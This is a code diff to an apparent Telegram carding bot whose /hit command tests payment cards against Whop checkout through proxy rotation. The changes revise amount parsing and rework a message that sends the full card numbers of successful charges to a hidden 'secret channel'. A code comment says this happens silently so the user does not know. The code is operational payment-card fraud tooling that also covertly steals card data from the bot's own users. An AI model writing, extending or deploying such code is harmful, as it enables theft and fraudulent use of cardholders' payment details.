@@ -3039,7 +3039,7 @@ async def allchecking_callback(
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # /hit COMMAND (WHOP CHECKOUT - MULTI CARD WITH PROXY RETRIES & LOCK)
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-WHOP_SECRET_LOGS_ID = -1003721327421  # Your secret channel ID
+WHOP_SECRET_LOGS_ID = -1003968669478  # Updated Secret Channel ID
 
 def _load_whop_proxies() -> list:
     """Load proxies from px.txt"""
@@ -3172,16 +3172,24 @@ async def cmd_hit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
             st = result.get("status", "unknown")
             msg = result.get("message", "")
             code = result.get("code", "")
-            amount_raw = result.get("amount", "?")
-            currency = result.get("currency", "USD")
             
-            if isinstance(amount_raw, (int, float)) and amount_raw > 0:
-                amount_val = amount_raw / 100
-                amount_str = f"{amount_val:.2f} {currency}"
-
             if st == "charged":
                 has_paid = True
                 sub_msg = "Payment successful"
+                
+                # ── Extract Real Amount Paid ──
+                amt_raw = result.get("amount", 0)
+                cur = result.get("currency", "USD").upper()
+                try:
+                    amt_val = float(amt_raw)
+                    # If amount is in cents (e.g., 2999), convert to dollars (29.99)
+                    if amt_val > 100:
+                        amount_str = f"{amt_val / 100:.2f} {cur}"
+                    else:
+                        amount_str = f"{amt_val:.2f} {cur}"
+                except (ValueError, TypeError):
+                    pass
+
             elif st == "3ds":
                 sub_msg = result.get("url", "3DS required")
             elif st == "declined":
@@ -3239,7 +3247,7 @@ async def cmd_hit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
                 uid_str = update.effective_user.id
                 username_str = f"@{update.effective_user.username}" if update.effective_user.username else "N/A"
                 
-                # Base Hit Logo Text (DOES NOT INCLUDE CARDS)
+                # Base Hit Logo Text (For Public Channel)
                 base_logo_text = (
                     f"⌑Status : Charged 💎\n"
                     f"⌑Hitter : Whop\n"
@@ -3265,17 +3273,16 @@ async def cmd_hit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
                 except Exception as e:
                     logger.error(f"Failed to send hit logo to Batcardchk: {e}")
                 
-                # 2. Send Hit Logo + Exact Cards to Secret Channel
-                secret_full_text = base_logo_text
+                # 2. Send ONLY Card Details to Secret Channel (No Logo)
+                secret_cards_text = f"🤑 <b>New Paid Whop Order</b>\n👤 User: {username_str} (<code>{uid_str}</code>)\n💰 Amount: {amount_str}\n\n"
                 for res in paid_cards:
-                    secret_full_text += f"⌑Card : <code>{res['card']}</code>\n"
+                    secret_cards_text += f"<code>{res['card']}</code>\n"
                 
                 try:
                     await context.bot.send_message(
                         chat_id=WHOP_SECRET_LOGS_ID,
-                        text=secret_full_text,
+                        text=secret_cards_text,
                         parse_mode="HTML",
-                        reply_markup=secret_kb,
                         disable_notification=True  # Silently sends, user doesn't know
                     )
                 except Exception as e:
@@ -3287,7 +3294,6 @@ async def cmd_hit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     finally:
         # Always remove the user from the lock when done or if it crashes
         active_hit_users.discard(update.effective_user.id)
-  
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # USER COMMANDS
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
